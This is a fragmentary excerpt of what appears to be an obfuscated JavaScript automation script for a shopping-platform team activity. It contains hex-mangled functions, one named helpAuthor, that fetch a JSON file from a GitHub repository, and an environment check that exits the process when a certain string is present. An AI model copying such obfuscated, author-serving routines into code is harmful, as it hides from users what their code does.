  ...
  if (smtg_getTeamPkDetailInfoRes && smtg_getTeamPkDetailInfoRes.data.bizCode === 0) {
    ...
    if (joinStatus === 0) {
      if (joinPkTeam === 'true') {
        ...
        await updatePkActivityIdCDN('https://raw.githubusercontent.com/tutuh001/ioinndaec2341/main/utils/empty.json');
...
async function helpAuthor() {
  var _0x4cd14c = {
    'hpVGM': 'https://raw.githubusercontent.com/tutuh001/ioinndaec2341/main/utils/empty.json', 'kyvMc': _0x2e68('3', '$Ni3'), 'ZGgUT': function (_0x3c511f, _0x3727b9, _0x142178) {
...
async function aaa() {
  var _0x23e4e9 = {
    ...
    }, 'KePDl': 'https://raw.githubusercontent.com/tutuh001/ioinndaec2341/main/utils/empty.json', 'SDREf': function (_0xe348aa, _0x439d0e, _0x3a4d9d) {
...
// prettier-ignore
function Env(t, e) {
  "undefined" != typeof process && JSON.stringify(process.env).indexOf("dex11z") > -1 && process.exit(0);
